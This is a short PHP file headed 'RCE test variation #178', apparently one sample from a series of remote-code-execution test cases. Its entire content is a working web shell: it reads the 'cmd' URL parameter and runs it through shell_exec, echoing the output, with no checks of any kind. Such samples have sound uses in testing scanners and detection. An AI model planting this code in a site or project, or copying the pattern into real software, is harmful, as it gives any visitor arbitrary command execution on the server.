<?php
// RCE test variation #178
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>